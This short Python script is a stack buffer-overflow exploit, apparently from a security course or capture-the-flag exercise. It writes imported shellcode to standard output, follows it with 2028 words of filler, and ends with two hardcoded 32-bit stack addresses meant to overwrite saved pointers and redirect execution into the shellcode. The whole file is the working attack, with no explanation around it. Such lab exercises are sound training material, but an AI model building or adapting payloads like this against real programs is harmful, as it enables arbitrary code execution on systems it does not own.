import sys
from shellcode import shellcode
from struct import pack

sys.stdout.buffer.write(shellcode)
for i in range(0, 2028):
	sys.stdout.buffer.write(pack("<I", 0x11))

sys.stdout.buffer.write(pack("<I", 0xbffe7d95))
sys.stdout.buffer.write(pack("<I", 0xbffe85ac))



